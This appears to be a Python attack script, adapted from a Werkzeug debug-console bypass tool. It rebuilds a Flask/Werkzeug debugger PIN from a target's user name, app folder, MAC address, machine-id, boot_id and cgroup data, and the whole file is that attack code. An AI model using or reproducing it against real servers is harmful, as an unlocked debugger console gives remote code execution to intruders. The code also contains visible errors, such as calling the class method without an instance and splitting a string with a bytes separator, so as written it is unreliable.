import sys,argparse
import hashlib
from itertools import chain

class Flask_decrypt:
    '''
        加密模式中因为flask版本差异，在Python3.9要求的flask版本中，PIN计算的加密模式有两种，一种为sha1，一种则为MD5加密
        运行模式指的是flask所运行的环境，Docker下有不同的计算方式，user这里指的是运行flask的用户，folder这里指的是flask所运行的文件夹
        
        此脚本基于werkzeug-debug-console-bypass.py
    '''
    def func(self,cmode='sha1'):
        return cmode

    def generate_mac_number(self,macaddress):
        if macaddress is None: raise ValueError('macaddress is None')        
        
        clean_mac = macaddress.replace(':','')

        if all(c in "0123456789abcdefABCDEF" for c in clean_mac):
            macnumber = str(int(clean_mac, 16))
        else:
            raise ValueError('?????error')
        return macnumber
       
    def generate_machine_id_mix(self, bootid, cgroup, machineid, docker):

        machine_id_bytes = b""

        if docker:
            machine_id_bytes += bootid.encode()
            if cgroup:
                machine_id_bytes += cgroup.split(b'/')[2].encode()
        
        else:
            for i in (machineid,bootid):
                machine_id_bytes += i.encode()
            if cgroup:
                machine_id_bytes += cgroup.split(b'/')[2].encode()

        machine_id = str(machine_id_bytes)
        return machine_id[2:50]
    
    
    def decryption(self,user,folder,macaddress,bootid,cmode,cgroup,docker,machineid): 
            
            num = None
            rv = None

            probably_public_bits = [
                user,
                'flask.app',
                'Flask',
                # locale flask folder if found
                folder
            ]
            
            private_bits = [
                self.generate_mac_number(macaddress), # 'adapter_mac_address'
                self.generate_machine_id_mix(bootid,cgroup,machineid,docker) # '/etc/machine-id + /proc/sys/kernel/random/boot_id + /proc/self/cgroup'
            ]

            #h = hashlib.sha1()
            if cmode != 'sha1':
                '''
                自己指定加密模式
                如果不指定的情况下默认为sha1
                '''
                h = hashlib.md5()
            else:
                h = hashlib.sha1()
        
            for bit in chain(probably_public_bits, private_bits):
                if not bit:
                    continue
                if isinstance(bit, str):
                    bit = bit.encode()
                h.update(bit)
            h.update(b'cookiesalt')
                
            cookie_name = f"__wzd{h.hexdigest()[:20]}"

            if num is None:
                h.update(b"pinsalt")
                num = f"{int(h.hexdigest(), 16):09d}"[:9]
        
            if rv is None:
                for group_size in 5, 4, 3:
                    if len(num) % group_size == 0:
                        rv = "-".join(
                            num[x : x + group_size].rjust(group_size, "0")
                            for x in range(0, len(num), group_size)
                        )
                        break
                else:
                    rv = num

            print(f"flask PIN is: {rv}")
    
if __name__ == '__main__':
        parser = argparse.ArgumentParser(description='Options for flask PIN decryption')
       
        parser.add_argument('--user',help='user name who running flask',required=True)
        parser.add_argument('--folder',help='flask folder which running machine',required=True)
        parser.add_argument('--cmode',help='crypt mode,default is sha1',required=False,default='sha1')
        parser.add_argument('--docker',help='select it if webapp running in docker',action='store_true')
        parser.add_argument('--machineid',help='machine id',required=True)
        parser.add_argument('--bootid',help='boot id',required=True)
        parser.add_argument('--cgroup',help='cgroup',required=True)
        parser.add_argument('--macaddress',help='mac address',required=True)


        args = parser.parse_args()

        if any(arg is None for arg in [args.bootid, args.machineid, args.user, args.folder, args.macaddress]) or not args.cgroup:
            print('please input --bootid --machineid --cgroup --user --folder --macaddress')
            sys.exit()
        
        
        decryptor = Flask_decrypt
        
        decryptor.decryption(
            machineid=args.machineid,
            macaddress=args.macaddress,
            bootid=args.bootid,
            cmode=args.cmode or 'sha1',
            user=args.user,
            folder=args.folder,
            cgroup=args.cgroup,
            docker=args.docker
            )